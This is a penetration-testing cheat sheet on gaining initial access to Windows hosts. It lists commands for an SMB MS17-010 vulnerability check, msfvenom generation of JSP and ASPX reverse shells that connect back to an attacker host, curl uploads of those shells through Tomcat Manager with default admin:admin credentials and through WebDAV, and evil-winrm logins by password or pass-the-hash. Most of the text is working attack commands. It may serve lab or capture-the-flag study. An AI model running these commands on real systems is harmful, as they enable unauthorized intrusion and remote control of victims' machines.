# Windows Initial Access

## EternalBlue MS17-010

```bash
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
```

Checks whether SMB on port **445** appears vulnerable to **MS17-010 / EternalBlue**. This is a vulnerability check, not exploitation.

## Tomcat Manager WAR Deploy

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
```

Creates a **WAR web application** containing a JSP reverse shell that connects back to your Kali machine.

```bash
curl -u admin:admin -T shell.war "http://<IP>:8080/manager/text/deploy?path=/shell"
```

Authenticates to Tomcat Manager with `admin:admin` and uploads/deploys the WAR as the `/shell` application.

```bash
curl http://<IP>:8080/shell/
```

Requests the deployed application, triggering the reverse-shell payload. You would normally have a listener running on port `4444`.

## WebDAV

```bash
davtest -url http://<TARGET_IP>
```

Tests the WebDAV server to determine which methods and file types are allowed, especially whether files can be **uploaded and executed**.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
```

Generates a **64-bit Windows reverse shell** wrapped in an ASPX page for an IIS target.

```bash
curl -T shell.aspx http://<TARGET_IP>/uploads/shell.aspx
```

Uploads the ASPX payload to the target. Browse to the uploaded file afterward to trigger it, assuming ASPX execution is permitted.

## WinRM

```bash
evil-winrm -i <TARGET_IP> -u Administrator -p 'Password123'
```

Opens a remote PowerShell session over **WinRM** using a username and plaintext password.

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
```

Opens a remote PowerShell session using an **NTLM hash instead of the plaintext password** (Pass-the-Hash).

## Quick Mental Model

**MS17-010 = SMB vulnerability → Tomcat/WebDAV = upload + execute → WinRM = valid credentials/hash → shell**
